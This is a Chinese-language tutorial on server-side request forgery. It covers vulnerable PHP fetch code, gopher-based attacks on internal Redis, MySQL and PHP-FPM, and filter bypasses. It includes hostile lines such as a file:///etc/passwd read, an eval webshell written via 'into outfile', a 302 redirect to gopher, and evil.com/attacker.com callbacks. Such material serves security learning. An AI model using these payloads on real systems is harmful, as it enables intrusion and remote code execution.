SSRF（Server Side Request Forgery，服务端请求伪造）是一种攻击者通过构造数据进而伪造服务器端发起请求的漏洞。 因为请求是由内部发起的，所以一般情况下，SSRF漏洞攻击的目标往往是从外网无法访问的内部系统。

SSRF的核心就是让服务器去请求一个用户可控的URL，攻击者往往会利用URL结构的各个部分（尤其是scheme、userinfo和host）来绕过WAF拦截或绕过代码层的内网限制。

SSRF产生原因：

  • 业务需求：服务器为了抓取图片、解析RSS、预览文档，必须提供从外部服务获取数据的功能。

  • 存在漏洞的服务器：后端代码对用户输入的URL零校验。用户传 http://127.0.0.1:6379，它就去请求内网Redis；传 file:///etc/passwd，它就读取本地文件。

  • 安全的服务器：做了严格的校验。比如白名单限制（只能访问 *.baidu.com）、内网IP拦截（解析IP发现是 192.168.x.x 就拒绝）、禁用危险协议（只允许http/https，禁用file/gopher）。

SSRF的核心危害：突破边界，探测内网，攻击内网未授权服务。

一、SSRF的利用基础§

URL结构解析§

  • scheme：表示获取资源所需要的协议，如 http, https, file, gopher, dict 等。 SSRF利用点：

    • 利用 file:// 读取本地文件

    • 利用 gopher:// 或 dict:// 向内网服务发送恶意数据包（如攻击Redis、MySQL）。

  • authority：由userinfo,host,port三部分组成。

    • userinfo@（用户信息）：即 用户名:密码@。这是一个可选项，一般HTTP使用匿名形式来获取数据，如果需要进行身份验证

      • SSRF绕过经典手法：见之后的URL解析差异部分

    • host：表示在哪个服务器上获取资源

      • SSRF利用点：这里填内网IP（如 192.168.x.x）或云服务器元数据IP（如 169.254.169.254）。

    • port：服务器端口。

      • SSRF利用点：用于内网端口探测，判断内网存在哪些服务（如 http://127.0.0.1:6379 探测Redis）。

  • path：指向资源的路径，一般使用“/”进行分层。

  • query：查询字符串，用户将用户输入数据传递给服务端

  • fragment：片段ID，与query不同的是，其内容不会被传递到服务端，一般用于表示页面的锚点。如 #top。通常只在浏览器端生效，不会发送给服务器，但在某些解析差异下可能用于绕过。

协议利用§

在对存在SSRF漏洞的应用进行测试的时候，可以尝试是否能控制、支持常见的协议，包括但不限于以下协议。

  • file://：从文件系统中获取文件内容，如file:///etc/passwd。

  • dict://：字典服务器协议，原本是用来提供在线字典查询的，默认端口是 2628。dict:// 协议允许客户端发送简单的文本命令。很多语言（如 PHP 的 curl、Python 的 urllib）默认支持该协议。SSRF核心利用手法：

    1. 探测内网端口是否开放：如果目标服务器内网有一台机器 192.168.1.100，想知道它开放了哪些端口。可以发请求：?url=dict://192.168.1.100:6379，如果端口没开，会报错（如 Connection refused）；如果开了，会有回显。
    2. 获取服务版本（Banner 抓取）：dict:// 最大的优势是，当你向目标发送不符合其协议规则的字符串时，目标往往会报错，而报错信息里经常包含服务的版本号。比如探测 Redis：?url=dict://127.0.0.1:6379/info。Redis 不认识 dict 协议，会返回一个错误提示，通常会带出 Redis 的版本。

  • gopher://：分布式的文档传递服务，在SSRF漏洞攻击中发挥的作用非常大。使用Gopher协议时，通过控制访问的URL可实现向指定的服务器发送任意内容，如HTTP请求、MySQL请求等。

gopher 是比 HTTP 还要古老的一种网络协议（1991年诞生，后来被 HTTP 淘汰了）。它的本来目的是用来在互联网上浏览网页的。

它的请求格式非常简单：gopher://主机IP:端口/请求内容。

之所以被称为“SSRF 神级协议”，是因为它有一个极其强大的特性：支持发送任意 TCP 字节流，且不限制协议。

二、SSRF常见的漏洞场景§

  • 能够对外发起网络请求的地方，就可能存在 SSRF 漏洞

  • 从远程服务器请求资源（Upload from URL，Import & Export RSS Feed）

  • 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）

  • Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）

  • 文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）

一些常见后端代码：

  • file_get_contents：可以控制 url 的话就能通过 http 伪协议进行渗透。

    php
     <?php

 if (isset($_GET['url'])) {
   $content = file_get_contents($_GET['url']);
   echo $content;
 }
 ?>

  • fsockopen()：这个函数允许我们对其本地的某个 socket 进行一个 TCP 链接，然后直接返回 HTTP 响应的文本。

    php
     function GetFile($host,$port,$link) { 
     $fp = fsockopen($host, intval($port), $errno, $errstr, 30);
     if (!$fp) { 
         echo "$errstr (error number $errno) \n"; 
     } else { 
         $out = "GET $link HTTP/1.1\r\n"; 
         $out .= "Host: $host\r\n"; 
         $out .= "Connection: Close\r\n\r\n";
         $out .= "\r\n"; 
         fwrite($fp, $out); 
         $contents='';
         while (!feof($fp)) { 
             $contents.= fgets($fp, 1024); 
         } 
         fclose($fp);
         return $contents;
     }
 }

  • curl_exec()：与 file_get_content 十分相似。

    php
     <?php
 if (isset($_POST['url'])) {
     $link = $_POST['url'];
     $curlobj = curl_init();
     curl_setopt($curlobj, CURLOPT_POST, 0);
     curl_setopt($curlobj,CURLOPT_URL,$link);
     curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
     $result=curl_exec($curlobj);
     curl_close($curlobj);

     echo $result;
 }
 ?>

三、SSRF漏洞攻击方式§

1. 内部服务资产探测§

SSRF漏洞可以直接探测网站所在服务器端口（6379 Redis、3306 MySQL、80 Web）的开放情况甚至内网资产情况，如确定该处存在SSRF漏洞，则可以通过确定请求成功与失败的返回信息进行判断服务开放情况。

2. 使用Gopher协议扩展攻击面§

攻击Redis§

攻击本质与核心链路

利用存在 SSRF 漏洞的目标服务器作为网络跳板，通过 Gopher 协议向其内网的 Redis 发送精心伪造的 TCP 原始报文。利用 Redis 的未授权访问及动态配置修改功能，实现任意文件写入，最终将 SSRF 升级为系统级 RCE（远程命令执行）。

原理（为什么 Redis 会被滥用）：

  1. 跨协议通信机制：攻击者处于外网，受限于防火墙无法直接访问内网 Redis（仅支持 Redis 协议）。Gopher 协议在此充当了 “任意 TCP 数据流构造器”。Web 请求（HTTP）作为载体，将 URL 编码后的原始 Redis 报文传递给跳板机（服务器），跳板机解码后将其还原为合法的 Redis 请求，向内网发起攻击。

  2. 持久化机制与配置滥用：Redis 默认无鉴权（空口令）。其数据存储于内存中，当执行 save 命令时触发 RDB 持久化（将内存数据落盘）。由于 Redis 的 config set 允许动态修改 dir（保存路径）和 dbfilename（保存文件名），且落盘时不校验文件后缀。攻击者借此将恶意 Payload（如系统命令、PHP代码）作为 Value 存入内存，随后篡改路径与文件名，执行 save 即可将其写入系统任意敏感目录。

核心利用点（两个参数）：

  • config set dir /var/spool/cron/（改路径）

  • config set dbfilename root（改文件名）

攻击思路：

  1. 资产探测（确认目标存活）：

    • URL参数可控

    • 尝试访问?url=http://127.0.0.1:6379,如果页面秒回 Connection refused，说明没开；如果页面卡住几秒后超时，说明端口可能被防火墙 Drop 了；如果返回了一段奇怪的报错（比如 -ERR wrong number of arguments for 'get' command），说明 Redis 存在。

  2. 利用条件确认：

    • 协议支持：确认后端支持 gopher:// 协议（如 PHP 环境默认支持）。

    • 权限要求：需确认 Redis 为空口令（未授权访问）。若有强密码，非交互式盲打几乎不可能，需转换攻击目标。

  3. 选择攻击路径：

    攻击路径 核心操作 (config set) 适用场景与前置条件 落地效果
    A. 打 Crontab dir 设为 /var/spool/cron/
    dbfilename 设为 root    		 无需知晓 Web 路径。
    前提：Redis 以高权限（通常是 root）启动。    		 写入定时任务，触发反弹 Shell。
    B. 写 WebShell dir 设为 Web 根目录（如 /var/www/html）
    dbfilename 设为 shell.php    		 需知晓网站绝对路径。
    前提：Redis 启动用户对 Web 目录有写权限。    		 生成一句话木马，通过蚁剑等工具连接。
    C. 写 SSH 公钥 dir 设为 /root/.ssh/
    dbfilename 设为 authorized_keys    		 需知晓 SSH 服务状态。
    前提：Redis 有 root 权限且 .ssh 目录存在。    		 写入攻击者公钥，实现 SSH 免密登录。

Payload构造思想：

我们要让 Redis 执行一套完整的“攻击连招”，通常包含 5 条命令：

  1. flushall （清空干扰数据）

  2. set 1 "恶意代码" （把木马写进内存）

  3. config set dir /var/spool/cron/ （修改写入路径）

  4. config set dbfilename root （修改文件名）

  5. save （落盘）

然后利用Redis的Pipeline特性直接拼接指令形成payload，让Gopher盲发。

可以直接拼接的原因是：Redis 的协议叫 RESP（Redis 序列化协议）。它的最大特点是：基于纯文本、结构极度简单。 攻击Mysql就不可以。

攻击MySQL§

攻击本质与核心链路

利用存在 SSRF 漏洞的目标服务器作为网络跳板，通过 Gopher 协议向其内网的 MySQL（3306端口）发送伪造的二进制客户端通信数据包。利用 MySQL 的空口令未授权访问漏洞，实现数据窃取或任意文件写入。

原理：

  1. 通信协议与认证机制：MySQL 采用二进制协议。MySQL分为客户端和服务端，由客户端连接服务端 有4种方式：UNIX套接字、内存共享、命名管道、TCP/IP套接字。前三种通常只在目标机器本地使 用，我们进行SSRF攻击只能走第4种：TCP/IP 套接字（通过网络连 127.0.0.1:3306）。 正常的 MySQL 登录：客户端发请求，MySQL 服务端先扔给你一个随机的字符串（ salt）。客户端必须用这个 salt 加上你的密码，算出一串哈希值发回去。服务端验证通过，才让你进。

  2. SSRF 的致命瓶颈：Gopher 协议是单向盲发的。攻击者无法接收目标返回的 salt 去计算哈希。因此，非交互式盲打下，只能攻击“空口令”（无密码）的 MySQL。

  3. 数据包提取难度：MySQL 不是纯文本协议，手敲或肉眼构造是不可能的，必须借助底层网络抓包工具提取原始字节流。

核心利用点：

  • 数据窃取：直接执行 select 语句，读取管理员账号密码等敏感数据。

  • 任意文件写入：在权限配置不当的情况下，执行 select '<?php eval($_POST[1]);?>' into outfile '/var/www/html/shell.php'; 写入 WebShell。

攻击思路：

  • 探测存活：SSRF 访问 ?url=http://127.0.0.1:3306，通过响应时间和报错（如 Malformed packet）确认端口开放。

  • 条件确认：盲测或通过信息泄露确认目标 MySQL 为空口令。

  • 构造数据包：本地模拟环境抓包 -> 提取 TCP 流 HEX 数据 -> 进行 URL 编码。

手动构造原理（基于 Wireshark 抓包）：

由于 MySQL 协议复杂，需在本地“模拟作案”来获取 Payload：

  1. 本地抓包：在本地（或内网测试机）启动 MySQL，使用 tcpdump -i lo port 3306 -w mysql.pcap 监听。

  2. 模拟操作：使用客户端执行登录、use 切库、select 查询等需要攻击的指令。

  3. 提取数据流：用 Wireshark 打开抓包文件，找到目标请求，追踪 TCP 流

  4. 按格式构造Payload

  5. 编码伪装：将提取出的一长串十六进制字节流进行 URL 编码，拼接进 gopher:// 链接。 (实战中，这串数据包含登录握手和查询指令，通常长达数百字节)

PHP-FPM攻击§

  1. CGI (Common Gateway Interface，通用网关接口)： Web 服务器（如 Nginx）本身只能处理静态文件（HTML、图片）。当遇到动态请求（如 PHP）时，服务器需要把请求转交给外部的程序去处理。CGI 就是服务器和外部程序之间通信的最古老的协议标准。

  2. FastCGI： CGI 的升级版。因为 CGI 每次处理请求都要启动新进程，效率极低。FastCGI 是一个常驻内存的协议，它通过长连接复用进程，极大地提升了性能。

  3. PHP-FPM (PHP FastCGI Process Manager)： PHP 官方提供的 FastCGI 进程管理器。它负责监听端口（默认 9000），接收 Web 服务器（Nginx）发来的 FastCGI 数据包，并调度 PHP 进程进行解析。

  4. php://input： PHP 中的一个输入流协议，代表客户端 HTTP 请求中 POST 的原始数据（Body 部分）。

  5. auto_prepend_file： php.ini 中的一个配置项。作用是在执行任何 PHP 文件之前，先自动包含（require）并执行该配置项指定的文件。

  6. allow_url_include： php.ini 中的配置项。决定是否允许通过 include/require 包含远程文件（包括 php://input 等特殊流）。

在现代 Web 架构中，Nginx 作为 Web 服务器，本身无法处理动态代码，必须将请求交由后端的 PHP-FPM 处理。它们之间的通信依赖于 FastCGI 协议。

  • 请求流转：客户端发起 HTTP 请求 -> Nginx 接收并解析 -> Nginx 将其封装成 FastCGI 协议报文 -> 发送至 PHP-FPM (默认监听 9000 端口) -> FPM 调度 PHP 进程执行并返回。

原理：

FastCGI 协议的报文结构中，除了包含 HTTP 的标准字段（如 Request_Method、Content-Length），还允许附带一个特殊字段：PHP_VALUE。 PHP_VALUE 的设计初衷是让 Nginx 能够动态覆盖 php.ini 中的局部配置。然而，这个功能赋予了攻击者篡改 PHP 运行时环境的能力。

攻击者利用 SSRF 漏洞，伪造 FastCGI 报文，并在报文中指定以下两项配置：

  1. PHP_VALUE = auto_prepend_file = php://input

    • 强制 PHP-FPM 在执行任何目标脚本前，先加载 php://input 流。

  2. PHP_VALUE = allow_url_include = On

    • 开启允许包含远程/特殊流文件的权限（默认关闭）。

结果：当 PHP-FPM 收到这个伪造的报文后，它会先读取请求 Body 中的 POST 数据，将其作为 PHP 代码执行，然后再执行目标文件。攻击者只需在 HTTP 请求的 Body 中写入恶意代码，即可完成任意代码执行（RCE）。

利用条件：

  1. 版本要求：libcurl > 7.45.0（支持构造任意 Gopher 报文）；PHP-FPM > 5.3.3（支持 PHP_VALUE 动态覆盖）。

  2. 网络要求：PHP-FPM 监听的是 TCP 端口（默认 9000），而不是 UNIX Socket（UNIX Socket 无法通过 SSRF 的 TCP 协议打通）。

  3. 前置信息获取：必须知晓服务器上任意一个已存在的 .php 文件的绝对路径。

    • 原因：FastCGI 在解析时，会先检查该文件是否存在。若不存在则直接报错，无法触发后续逻辑。

    • 限制：受 security.limit-extensions 限制，该文件后缀必须是 .php。

    • 破解思路：利用 file:// 协议读取服务器配置、源码，或盲猜默认路径（如 /var/www/html/index.php、/usr/local/lib/php/PEAR.php 等）。

Payload构造思路：

FastCGI 协议是基于二进制的，包含包头、长度、状态码等极其复杂的结构，人类无法像手写 Redis 纯文本命令那样直接手敲 Payload。

  1. 生成二进制流：使用脚本或工具，按照 FastCGI 协议规范，将恶意配置和代码打包成一段二进制数据。

  2. 借助 Gopher 传输：由于 SSRF 通常基于 HTTP，无法直接发送二进制。而 Gopher 协议支持传输原始 TCP 字节流（包含任意二进制和特殊字符）。

  3. 封装 Payload：将生成的 FastCGI 二进制流进行 URL 编码，拼接在 gopher://127.0.0.1:9000/_ 之后，通过 SSRF 漏洞向目标服务器发送。

攻击内网中的脆弱Web应用（伪造 HTTP POST 请求）§

在复杂的内网环境中，大量的内部系统（如 Jenkins、OA、内部 API 管理台）往往存在高危漏洞。但这些漏洞通常不接受简单的 GET 请求，而是需要 POST 数据（如命令执行参数、序列化数据），甚至需要特定的 Header（如 Cookie、认证 Token）。

常规的 SSRF 漏洞只能利用 http:// 发起简单的 GET 请求，无法携带 Body 数据，导致无法触发内网 Web 应用的真实漏洞。

利用 Gopher 协议能够传输原始 TCP 数据流的特性，构造一个完整的 HTTP POST 报文，让存在 SSRF 的服务器将其原封不动地投递给内网目标。

攻击链路：

  1. 获取原始请求报文：利用 Burp Suite 拦截本地发往目标的请求，或使用 nc（Netcat）监听本地端口模拟请求，抓取原始数据流。

  2. 构造 Payload：

    • 修改 Body（想执行的行为）；

    • 重算长度（Content-Length）；

    • URL 编码（把换行变成 %0d%0a，空格变成 %20）；

    • 拼装（前缀加上 gopher://127.0.0.1:80/_）

  3. 攻击：将生成的 Payload 注入到 SSRF 漏洞点，受害者服务器通过内网向 127.0.0.1:80 发送伪造的 POST 报文，触发漏洞。

小结§

以上SSRF 跨协议攻击内网服务的场景中，核心利用逻辑均是通过 SSRF 漏洞，控制目标服务器向内部网络发送伪造的协议数据包（以 Gopher 协议为载体），突破网络边界隔离。

攻击目标 应用层协议特征 核心前置条件（实战门槛） 数据包构造方式 最终利用效果
Redis RESP（纯文本） 存在未授权访问（空口令） 低：可直接拼接文本指令 写入计划任务/WebShell（RCE）
MySQL MySQL 协议（二进制） 必须为空口令（单次盲发无法处理认证挑战） 极高：需抓包提取完整通信流 数据窃取 / 写入 WebShell
PHP-FPM FastCGI（二进制） 必须获取一个真实存在的 .php 文件绝对路径 极高：依赖自动化工具生成 篡改运行时配置，直接执行代码（RCE）
脆弱 Web HTTP(S)（文本） 内部系统存在接收 POST 的特定业务漏洞 中等：抓包获取原始报文并重算长度 触发业务漏洞、越权操作、命令执行

前三者属于攻击底层基础服务设施（Redis缓存、MySQL数据存储、PHP-FPM代码解析）。通过 SSRF 向这些服务发送伪造数据包，利用其配置缺陷（如无鉴权、动态改配置），实现写入恶意文件（Redis/MySQL）或执行任意代码（PHP-FPM），最终目的是获取服务器最高控制权，彻底接管该机器（RCE）。这类攻击严重依赖底层协议（二进制）的抓包与伪造，且极受目标安全配置（如空口令、绝对路径）的限制。

攻击内网中的脆弱Web应用属于攻击业务应用系统，它的目标是运行在基础服务之上的具体业务系统（如内部 OA、Jenkins、管理后台）。通过 SSRF 伪造完整的 HTTP POST 请求（或带特定 Header），绕过内外网边界，直接触发内网系统的特定业务漏洞（如越权、命令执行接口），获取或操作业务数据。这种攻击不一定能拿下服务器的底层系统权限（RCE），但能借此访问到原本无法访问的内部数据，或者执行特定的业务动作。

四、SSRF的绕过§

1. 针对 IP 格式拦截的绕过（字符串层）§

防守逻辑：对的是用户输入中直接出现的内网 IP 地址（如 127.0.0.1、192.168.1.1）进行字符串匹配或正则拦截。

绕过思路：改变 IP 的书写形式，只要让服务器（Linux/PHP/curl）还能认出这是 127.0.0.1，但让正则表达式认不出就行了。

进制转换§

计算机底层是二进制，但在解析 IP 时，其实只认数字。所以可以把 127.0.0.1 算成一个巨大的整数：

  • 十进制：2130706433

  • 十六进制：0x7F000001（前面加 0x）

  • 八进制：017700000001（前面加 0，甚至可以加多个 0，如 00017700000001）

特殊字符替换§

把数字换成长得像数字的特殊 Unicode 字符。比如 127.0.0.1 变成 127.⓪.⓪.①。

采用回环地址变体§

  • IPv6 形式：http://[::1] 或 http://[::ffff:127.0.0.1] （注意 URL 中 IPv6 必须带方括号）。

  • localhost 形式：http://localhost

  • 整个回环网段：127.0.0.0/8 都是本机，所以 http://127.255.255.254 也是指向你自己。

  • DNS 变体：http://0、http://127.1。

2. 针对敏感目标拦截的绕过（域名/链路层）§

防守逻辑：拦截危险协议（gopher）、拦截内网 IP 字符串、或只允许白名单域名。

绕过思路：不直接暴露恶意目标，而是利用合法域名或重定向作为“跳板”。

利用公共泛解析服务（xip.io / nip.io / sslip.io）§

注：现已被大多数 WAF 拉黑

访问 http://127.0.0.1.xip.io的 DNS 解析结果就是 127.0.0.1。WAF 看这是个外网域名，放行了，结果服务器一解析，打到了内网。

利用第三方重定向（短链接）§

针对只查初始 URL 的防守

短链接本质是一种开放重定向服务。将一个长网址（如 http://127.0.0.1/flag.php）提交给短链接平台（如 dwz.cn、bitly），平台会生成一个极短的链接（如 dwz.cn/xxx）。当有人访问这个短链接时，短链接服务器会返回一个 HTTP 302 重定向响应，告诉浏览器/客户端“请去访问原始的长网址”。如果后端代码允许跟随重定向（CURLOPT_FOLLOWLOCATION），就中招了。

自建 302 重定向§

攻击者自己完全控制跳转逻辑。短链接只能跳转到 HTTP/HTTPS 地址，而自写 302 可以跳转到 gopher:// 等危险协议，用于突破 WAF 对协议的封锁。（也可以在 302 的 Location 里面放 dict:// 甚至 file://） 攻击者需要一台有公网 IP 的服务器（VPS），并在上面搭建一个 Web 服务（如 Apache/Nginx + PHP）。然后在该服务器上创建一个 PHP 文件： <?php header("Location: gopher://192.168.80.2:6379/_..."); ?> SSRF 所在的服务器先正常访问攻击者的 http:// 服务器，攻击者的服务器返回 302 让它去访问 gopher://，从而绕过协议限制。

重域名（静态解析欺骗）§

现代 WAF 通常会维护一个庞大的黑名单库，不仅拦截内网 IP，还会直接拉黑 xip.io、nip.io 等已知的公共泛解析服务。此外，有些业务代码写死了严格的域名白名单（比如只允许访问 *.trusted-cdn.com）。

  • 绕过思路（域名欺骗）：攻击者利用自定义域名进行静态解析欺骗。具体操作是：注册一个看起来毫无威胁的合法外网域名（例如伪装成图片 CDN 的 img.cdn-static.com），在 DNS 管理后台添加一条 A 记录，将其强行指向内网 IP（如 127.0.0.1）。

  • 生效过程：当攻击者向存在 SSRF 的服务器传入 ?url=http://img.cdn-static.com:6379 时，WAF 检查字符串，发现这是一个合法且看似正常的域名（或者是白名单内的域名），直接放行。随后服务器底层请求 DNS 服务器，解析出真实 IP 为 127.0.0.1，从而成功触达内网目标。

  • 实战：在高级红队行动中，攻击者有时会通过“子域名接管”漏洞，直接控制某合法企业的一个废弃子域名，利用目标企业自身的信誉来绕过其内部防护设备。

3. 针对组件解析差异的绕过（代码逻辑层）§

这种还是挺常见的，因为 WAF 和业务代码往往不是同一家公司写的，只要框架版本有差异，这种漏洞永远杀不绝。

利用了不同代码组件（比如 PHP 自带的解析函数 和 curl 库）在解析同一个 URL 时的标准不一致。 代码逻辑：

  1. 用 parse_url() 提取出 host，检查是不是内网。

  2. 如果没问题，就把整个 URL 塞给 curl_exec() 去执行。

攻击者构造的 Payload：http://a@127.0.0.1:80@baidu.com

  • parse_url() 这个函数看到 URL，认为最后一个 @ 后面的是真域名，所以它提取出的 host 是：baidu.com。代码一查，这是外网域名，安全，放行！

  • 但是，curl 这个工具在底层执行时，它认为第一个 @ 前面的 a 是用户名，第一个 @ 后面的 127.0.0.1:80 是主机，第二个 @ 后面的 baidu.com 是路径的一部分。所以它真正请求的是：127.0.0.1:80。

其它：

  • 利用 # 符号：http://127.0.0.1#@baidu.com（有些解析器认为 # 后面是锚点，忽略掉，结果检查放行，但 curl 可能会去请求内网）。

  • 利用反斜杠：某些解析器（如 PHP 的某些版本）会把 \ 当作 /，但前端正则可能不认。http://127.0.0.1\@baidu.com。

4. 针对“先解析后请求”逻辑的绕过（DNS 重绑定）§

很多高级的 WAF 或安全代码，不会傻傻地去正则匹配字符串。它们用的是 “先解析，后请求” 的逻辑：

  1. 提取 URL 里的域名（如 http://evil.com）。

  2. 进行第一次 DNS 解析，拿到 IP。

  3. 检查这个 IP 是不是内网（如 127.0.0.1）。

  4. 如果检查发现是公网 IP（安全），放行。

  5. 把 URL 交给 curl，让 curl 去请求。

curl 在请求时，会根据域名再次进行 DNS 解析（第二次解析）。由于网络缓存机制或攻击者的操控，这两次解析的 IP 可能是不一样的！

攻击原理（TOCTOU 时间差攻击）：

TTL=0：黑客在自己的 DNS 解析中，把 TTL（生存时间）设为 0。这意味着受害者服务器不能缓存这个解析结果，每次用都必须重新问黑客。

  1. 黑客搭建一个自己的 DNS 服务器，准备一个域名 evil.com并将其 NS 记录指向自己控制的 DNS 服务器，然后在该 DNS 服务器上编写程序（或使用工具）。

  2. 受害者服务器发起第一次 DNS 查询：黑客的 DNS 服务器返回 8.8.8.8。

  3. 受害者代码一看 8.8.8.8，放行！

  4. 紧接着，底层代码（如 curl）发起第二次 DNS 查询准备真实发包：黑客的 DNS 服务器返回 127.0.0.1。

  5. 于是，受害者的 curl 去请求了 127.0.0.1，攻击达成。

  • 重域名（静态欺骗）：域名与内网 IP 是固定绑定的。它主要针对“只看字符串和域名的黑名单/白名单”。技术门槛低，买域名改 A 记录即可。

  • DNS 重绑定（动态欺骗）：域名在公网 IP 与内网 IP 之间反复横跳。它主要针对“先解析域名、后校验 IP”的高级代码逻辑。技术门槛高，必须自建 DNS 服务器并设置 TTL=0，利用两次解析的时间差（TOCTOU）绕过检查。

5. 针对网络架构的绕过（外网访问绕过）§

  • 防守逻辑：内网 WAF 或代码严格拦截 127.0.0.1 及所有变体，完全封死回环访问。

  • 绕过原理（利用 NAT 环回）： 绝大多数云服务器（如阿里云、腾讯云、AWS）的公网 IP 并非直接绑定在网卡上，而是通过云网关进行 NAT（网络地址转换）映射。当服务器内部向自身的公网 IP 发起请求时，流量会出网卡到达云网关，网关识别到该目标为自身，随后将流量原路折返（Hairpin NAT）。因此，服务器访问自身的公网 IP，在逻辑上等同于访问本机。

  • 操作步骤：

    1. 探测公网 IP：利用 SSRF 漏洞，让目标服务器请求攻击者控制的公网 VPS 或 DNSLog 域名（如 ?url=http://attacker.com）。在 VPS 的访问日志或 DNSLog 记录中，提取目标服务器请求时的真实源 IP。

    2. 替换攻击目标：将原本被拦截的 127.0.0.1 替换为刚刚获取到的目标服务器公网 IP。

    3. 发起攻击：构造请求 ?url=http://目标公网IP:6379，目标服务器发起请求后，流量经过云网关环回，成功触达本机内网服务。

该手法的成功率取决于目标环境的网络架构。部分企业硬件防火墙或云厂商的安全组策略默认禁用 NAT 环回（Hairpin NAT），此时从内部访问自身公网 IP 会导致连接超时。实战中需通过响应时间或报错信息判断是否打通。

五、SSRF的防御手法§

  • 过滤返回信息，判断返回信息是否带有敏感信息。（一般防不住注入命令）

  • 禁用协议，在服务项目比较单一的服务里面只允许使用 HTTP 协议或者 HTTPS 协议，禁止其他的所有协议的使用。（比较有效，但是局限性高）

  • 设置 URL 白名单或者限制可访问的内网 IP。

  • 加入详细的日志系统，剩下的活让护网的去干
